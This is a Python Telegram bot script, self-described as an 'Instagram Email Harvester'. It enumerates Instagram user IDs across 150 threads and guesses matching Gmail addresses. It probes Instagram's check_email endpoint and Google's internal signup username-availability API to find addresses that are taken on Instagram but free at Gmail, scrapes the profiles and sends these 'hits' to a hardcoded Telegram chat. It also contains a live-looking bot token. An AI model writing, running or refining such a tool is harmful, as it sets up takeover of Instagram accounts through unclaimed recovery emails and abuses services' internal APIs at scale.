#!/usr/bin/env python3
"""
🤖 Telegram Bot - Instagram Email Harvester
    Pure requests-based polling (no python-telegram-bot)
    ✅ Pydroid3 / Android / Render compatible
    ✅ No asyncio issues
    ✅ Original logic preserved 100%
"""

import os
import sys
import re
import json
import random
import string
import time
import threading
import logging
import base64
import ssl
from datetime import datetime, timedelta
from time import time as time_time
from hashlib import md5
from random import choice, randrange
from concurrent.futures import ThreadPoolExecutor

import requests
import httpx
import user_agent
from cfonts import render, say
from requests import post as pp
from user_agent import generate_user_agent as gg
from random import choice as cc
from random import randrange as rr
from rich.console import Console

# ─────────── HARDCODED TELEGRAM CREDENTIALS ───────────
BOT_TOKEN = "8760415886:AAH-JhrbqKGtfyc_-zJ4ewGedle2Q-vvJj0"
CHAT_ID = "8598993143"

# ─────────── GLOBALS ───────────
checker_running = False
checker_thread = None
checker_instance = None
last_update_id = 0

# ─────────── PURE REQUESTS TELEGRAM API ───────────

def tg_send(chat_id, text, parse_mode='Markdown'):
    """Send a message via Telegram Bot API using raw requests"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def tg_send_inline_buttons(chat_id, text, buttons):
    """Send a message with inline keyboard buttons"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": chat_id,
            "text": text,
            "parse_mode": "Markdown",
            "reply_markup": {"inline_keyboard": buttons}
        }
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def tg_edit(chat_id, message_id, text, parse_mode='Markdown'):
    """Edit an existing message"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        payload = {
            "chat_id": chat_id,
            "message_id": message_id,
            "text": text,
            "parse_mode": parse_mode
        }
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def tg_answer_callback(callback_id, text=None):
    """Answer a callback query"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
        payload = {"callback_query_id": callback_id}
        if text:
            payload["text"] = text
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def tg_get_updates(offset=None):
    """Get pending updates from Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
        params = {"timeout": 30}
        if offset:
            params["offset"] = offset
        resp = requests.get(url, params=params, timeout=35)
        data = resp.json()
        if data.get("ok"):
            return data.get("result", [])
    except:
        pass
    return []

# ═══════════════════════════════════════════════════════════
#  ORIGINAL CHECKER CLASS - PRESERVED 100%
# ═══════════════════════════════════════════════════════════

class InstagramEmailChecker:
    def __init__(self):
        self.hits = 0
        self.bads_instgram = 0
        self.bads_email = 0
        self.p1 = 0
        self.ID = CHAT_ID
        self.token = BOT_TOKEN
        self.rest = 1
        self.bot_asked = True

        self.PREDEFINED_BOT_TOKEN = BOT_TOKEN
        self.PREDEFINED_CHAT_ID = CHAT_ID

        self.Z = '\033[1;31m'
        self.Z1 = '\033[2;31m'
        self.F = '\033[2;32m'
        self.A = '\033[2;34m'
        self.C = '\033[1;97m'
        self.J = '\033[2;36m'
        self.Y = '\033[1;34m'
        self.X = '\033[1;33m'
        self.M = '\x1b[1;37m'
        self.S = '\033[1;33m'
        self.R = '\033[1;31m'
        self.C1 = '\033[2;35m'
        self.H = '\x1b[38;5;208m'
        self.ED = '\x1b[38;5;208m'
        self.Bl = '\033[1;34m'
        self.P = '\033[1;35m'
        self.G = '\033[1;32m'
        self.N = '\033[1;37m'

        self.yy = 'azertyuiopmlkjhgfdsqwxcvbn'
        self.ids = []

    def display_banner(self):
        try:
            pt7 = render('PT7', colors=['white', 'red'], align='center')
            print(pt7)
        except:
            pass

    def send_to_bots(self, message):
        """Send hit details to Telegram"""
        try:
            response = requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                params={"chat_id": CHAT_ID, "text": message, "parse_mode": "Markdown"},
                timeout=5
            )
        except:
            pass

    def send_status_screen(self):
        """Send live status after each hit"""
        status = (
            f"📊 *Live Status*\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"• HITS      : `{self.hits}`\n"
            f"• BAD MAIL  : `{self.bads_email}`\n"
            f"• BAD INSTA : `{self.bads_instgram}`\n"
            f"• RUNNING   : `{'✅ ACTIVE' if checker_running else '❌ STOPPED'}`\n"
            f"━━━━━━━━━━━━━━━━━━━\n"
            f"`@cruzz // @pythontoolz`"
        )
        self.send_to_bots(status)

    def get_bot_details(self):
        pass

    def tll(self):
        try:
            n1 = ''.join(cc(self.yy) for i in range(rr(6, 9)))
            n2 = ''.join(cc(self.yy) for i in range(rr(3, 9)))
            host = ''.join(cc(self.yy) for i in range(rr(15, 30)))
            he3 = {
                "accept": "*/*",
                "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
                "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
                "google-accounts-xsrf": "1",
                "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
                "sec-ch-ua-arch": "\"\"",
                "sec-ch-ua-bitness": "\"\"",
                "sec-ch-ua-full-version": "\"116.0.5845.72\"",
                "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
                "sec-ch-ua-mobile": "?1",
                "sec-ch-ua-model": "\"ANY-LX2\"",
                "sec-ch-ua-platform": "\"Android\"",
                "sec-ch-ua-platform-version": "\"13.0.0\"",
                "sec-ch-ua-wow64": "?0",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
                "x-client-data": "CJjbygE=",
                "x-same-domain": "1",
                "Referrer-Policy": "strict-origin-when-cross-origin",
                'user-agent': str(gg()),
            }

            res1 = requests.get('https://accounts.google.com/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB', headers=he3)
            tok = re.search(r'data-initial-setup-data="%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&', res1.text).group(2)
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp',
                'user-agent': gg(),
            }
            data = {
                'f.req': '["' + tok + '","' + n1 + '","' + n2 + '","' + n1 + '","' + n2 + '",0,0,null,null,"web-glif-signup",0,null,1,[],1]',
                'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]',
            }
            response = pp(
                'https://accounts.google.com/_/signup/validatepersonaldetails',
                cookies=cookies,
                headers=headers,
                data=data,
            )
            tl = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict()['__Host-GAPS']
            try:
                os.remove('tl.txt')
            except:
                pass
            with open('tl.txt', 'a') as f:
                f.write(tl + '//' + host + '\n')
        except Exception as e:
            print(e)
            self.tll()

    def check_googlemail(self, email):
        if '@' in email:
            email = str(email).split('@')[0]
        try:
            try:
                o = open('tl.txt', 'r').read().splitlines()[0]
            except:
                self.tll()
                o = open('tl.txt', 'r').read().splitlines()[0]
            tl, host = o.split('//')
            cookies = {'__Host-GAPS': host}
            headers = {
                'authority': 'accounts.google.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded;charset=UTF-8',
                'google-accounts-xsrf': '1',
                'origin': 'https://accounts.google.com',
                'referer': 'https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&parent_directed=true&theme=mn&ddm=0&flowName=GlifWebSignIn&flowEntry=SignUp&TL=' + tl,
                'user-agent': gg(),
            }
            params = {'TL': tl}
            data = 'continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn&f.req=%5B%22TL%3A' + tl + '%22%2C%22' + email + '%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&'
            response = pp(
                'https://accounts.google.com/_/signup/usernameavailability',
                params=params,
                cookies=cookies,
                headers=headers,
                data=data,
            )
            print(response.text)
            if '"gf.uar",1' in str(response.text):
                return 'good'
            elif '"er",null,null,null,null,400' in str(response.text):
                self.tll()
                return self.check_googlemail(email)
            else:
                return 'bad'
        except:
            return self.check_googlemail(email)

    def info(self, username, jj):
        try:
            url = f"https://www.instagram.com/{username}/"
            headers = {"User-Agent": "Mozilla/5.0"}
            response = requests.get(url, headers=headers)
            html = response.text
            match = re.search(r'"profile_id":"(\d+)"', html)
            user_id = match.group(1)
            response = requests.post(
                "https://www.instagram.com/graphql/query",
                headers={
                    'accept': '*/*',
                    'content-type': 'application/x-www-form-urlencoded',
                    'user-agent': 'Mozilla/5.0',
                    'x-asbd-id': '359341',
                    'x-csrftoken': 'njXfzdB0S2d5HR-tZJ6Zfm'
                },
                data={
                    'lsd': 'AVooTjceqws',
                    'variables': f'{{"id":"{user_id}","render_surface":"PROFILE"}}',
                    'server_timestamps': 'true',
                    'doc_id': '9661599240584790'
                }
            ).json()
            user = response['data']['user']
            name = user['full_name']
            username = user['username']
            uid = user['id']
            try:
                from asmix import Instagram
                date = Instagram.date(uid)
            except:
                date = 'None'
            posts = user['media_count']
            followers = user['follower_count']
            following = user['following_count']
            is_business = user['is_business']
            is_private = user['is_private']
            is_verified = user['is_verified']
            profile_pic = user['hd_profile_pic_url_info']['url']

            chut = f'''
────────────────────────
   NAME          ▸ {name}
   USER          ▸ {username}
   EMAIL         ▸ {username}@{jj}
   ID            ▸ {uid}
   POSTS         ▸ {posts}
   FOLLOWERS     ▸ {followers}
   FOLLOWING     ▸ {following}
   BUSINESS      ▸ {is_business}
   DATE          ▸ {date}
   REST          ▸ {self.rest}
   LINK          ▸ https://instagram.com/{username}
   
────────────────────────
  BY : @cruzz // @pythontoolz
────────────────────────
   '''

            if posts >= 1:
                self.hits += 1
                self.send_to_bots(chut)
                self.send_status_screen()
                with open('hits.txt', "a", encoding="utf-8") as f:
                    f.write(chut + "\n")
        except Exception as e:
            chut = f"""
 Username : {username}
 Email    : {username}@{jj}
 Rest     : {self.rest}
 https://instagram.com/{username}
────────────────────────
BY : @cruzz // @pythontoolz
────────────────────────
"""
            self.hits += 1
            self.send_to_bots(chut)
            self.send_status_screen()
            with open('cruzzhits.txt', "a", encoding="utf-8") as f:
                f.write(chut + "\n")

    def bmw(self, email):
        try:
            if 'good' == self.check_googlemail(email):
                username, jj = email.split('@')
                self.info(username, jj)
            else:
                self.bads_email += 1
        except:
            pass

    def check(self, email):
        global checker_running
        if not checker_running:
            return
        try:
            pp_choice = choice('00')
            if pp_choice == '0':
                with httpx.Client(http2=True) as client:
                    r = client.post(
                        "https://i.instagram.com/api/v1/users/check_email/",
                        data=f"email={email}",
                        headers={
                            'User-Agent': "Instagram 166.0.0.30.120 Android (30/11; 1440dpi; 2560x1440; samsung; SM-G973F; x86_64; tablet; en_US; kirin)",
                            'content-type': "application/x-www-form-urlencoded; charset=UTF-8"
                        }
                    ).json()

                    if r.get('error_type') == 'email_is_taken':
                        self.bmw(email)
                    else:
                        self.bads_instgram += 1
                    os.system('clear')
                    print(f'''
×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×   
       HITS : {self.hits} 
       BAD MAIL : {self.bads_email}
       BAD INSTA : {self.bads_instgram}
       EMAIL : {email}  
×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×    
ADMIN :- @cruzz 
×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×•×   ''')
        except Exception as e:
            print(f"error: {e}")

    def Users(self, iud, uid):
        global checker_running
        if not checker_running:
            return
        try:
            headers = {
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.instagram.com',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36',
                'x-csrftoken': 'GXmNMinj7hQfdQoCv1sVETC1JkUGyvDe',
            }
            data = {
                'variables': '{"id":"' + str(rr(iud, uid)) + '","location_id":"","shared_entity_id":"","shid":"","skip_location":true,"skip_sharer":true,"skip_user":false}',
                'doc_id': '23907016675582737',
            }
            response = requests.post('https://www.instagram.com/graphql/query', cookies={}, headers=headers, data=data)
            user = response.json()['data']['fetch__XDTUserDict']['username']
            email = user + '@gmail.com'
            self.check(email)
        except Exception as e:
            pass

    def ExUsers(self, iud, uid):
        global checker_running
        for _ in range(1000):
            if not checker_running:
                break
            self.Users(iud, uid)

    def run(self, num):
        """Run the checker with year choice (1-6)"""
        global checker_running

        self.tll()
        os.system('clear')

        if num == 1:
            uid = 18957417
            iud = 10000
        elif num == 2:
            uid = 287924624
            iud = 18314009
        elif num == 3:
            uid = 461365132
            iud = 1801651
        elif num == 4:
            iud = 361365132
            uid = 1682665388
        elif num == 5:
            iud = 1682665388
            uid = 3382665388
        elif num == 6:
            iud = 2682665388
            uid = 8682665388
        else:
            return

        tg_send(CHAT_ID, f"🚀 *Checker STARTED* for year option {num}\n\n`@cruzz // @pythontoolz`")

        threads = []
        for _ in range(150):
            thread = threading.Thread(target=self.ExUsers, args=(iud, uid))
            thread.start()
            threads.append(thread)

        for thread in threads:
            thread.join()

        global checker_running
        checker_running = False
        tg_send(CHAT_ID, f"✅ *Checker FINISHED* — Total Hits: `{self.hits}`\n\n`@cruzz // @pythontoolz`")


# ═══════════════════════════════════════════════════════════
#  TELEGRAM BOT POLLING LOOP (pure requests, no asyncio)
# ═══════════════════════════════════════════════════════════

def handle_update(update):
    """Process a single Telegram update"""
    global checker_running, checker_thread, checker_instance, last_update_id

    # Handle callback queries (button presses)
    if "callback_query" in update:
        cq = update["callback_query"]
        cq_id = cq["id"]
        chat_id = cq["message"]["chat"]["id"]
        msg_id = cq["message"]["message_id"]
        data = cq["data"]

        tg_answer_callback(cq_id)

        if data.startswith("year_"):
            year = int(data.split("_")[1])
            year_map = {1: "2011", 2: "2012", 3: "2013", 4: "2014", 5: "2015", 6: "2016-2017"}
            year_label = year_map.get(year, str(year))

            tg_edit(chat_id, msg_id, f"🚀 *Starting checker for {year_label}...*\n\nHits & live stats will appear here automatically.\nUse /status anytime.")

            checker_instance = InstagramEmailChecker()
            checker_thread = threading.Thread(target=checker_instance.run, args=(year,), daemon=True)
            checker_running = True
            checker_thread.start()

    # Handle text commands
    elif "message" in update:
        msg = update["message"]
        chat_id = msg["chat"]["id"]
        text = msg.get("text", "")

        if text == "/start":
            tg_send(chat_id, (
                "🤖 *Instagram Email Harvester Bot*\n\n"
                "Select a year range via /run and the bot will:\n"
                "• Scan Instagram user IDs from that era\n"
                "• Check if the Gmail exists via Google's signup API\n"
                "• Verify the account on Instagram\n"
                "• Send hits + live stats to this chat\n\n"
                "📋 *Commands:*\n"
                "• /run — Start checker (year selection)\n"
                "• /stop — Stop the checker\n"
                "• /status — Show current stats\n"
                "• /start — Show this menu\n\n"
                "`Powered by @cruzz // @pythontoolz`"
            ))

        elif text == "/run":
            if checker_running:
                tg_send(chat_id, "⚠️ *Checker is already running!*\nUse /stop first.")
            else:
                buttons = [
                    [
                        {"text": "📅 2011", "callback_data": "year_1"},
                        {"text": "📅 2012", "callback_data": "year_2"},
                    ],
                    [
                        {"text": "📅 2013", "callback_data": "year_3"},
                        {"text": "📅 2014", "callback_data": "year_4"},
                    ],
                    [
                        {"text": "📅 2015", "callback_data": "year_5"},
                        {"text": "📅 2016-2017", "callback_data": "year_6"},
                    ],
                ]
                tg_send_inline_buttons(chat_id, "📆 *Select a year range to scan:*", buttons)

        elif text == "/stop":
            if checker_running:
                checker_running = False
                tg_send(chat_id, "⏹️ *Stop signal sent...* Waiting for threads to finish.")
            else:
                tg_send(chat_id, "❌ Checker is *not* currently running.")

        elif text == "/status":
            if checker_instance:
                status = (
                    f"📊 *Live Status*\n\n"
                    f"• Hits       : `{checker_instance.hits}`\n"
                    f"• Bad Mail   : `{checker_instance.bads_email}`\n"
                    f"• Bad Insta  : `{checker_instance.bads_instgram}`\n"
                    f"• Running    : {'✅ Yes' if checker_running else '❌ No'}\n\n"
                    f"`@cruzz // @pythontoolz`"
                )
                tg_send(chat_id, status)
            else:
                tg_send(chat_id, "❌ Checker has not been started yet. Use /run.")


def bot_polling_loop():
    """Main polling loop — runs in main thread, no asyncio needed"""
    global last_update_id

    # Send startup notification
    try:
        tg_send(CHAT_ID, "🤖 *Bot is online!*\n\nReady to run Instagram email harvester.\nUse /run to start scanning.")
    except:
        pass

    while True:
        try:
            updates = tg_get_updates(offset=last_update_id)
            for update in updates:
                if "update_id" in update:
                    last_update_id = update["update_id"] + 1
                    handle_update(update)
        except KeyboardInterrupt:
            print("\n👋 Bot shutting down...")
            break
        except Exception as e:
            print(f"Polling error: {e}")
            time.sleep(5)


# ═══════════════════════════════════════════════════════════
#  MAIN ENTRY POINT
# ═══════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("🤖 Starting Telegram bot polling (pure requests)...")
    print(f"   Bot Token : {BOT_TOKEN[:8]}...")
    print(f"   Chat ID   : {CHAT_ID}")
    print()
    bot_polling_loop()
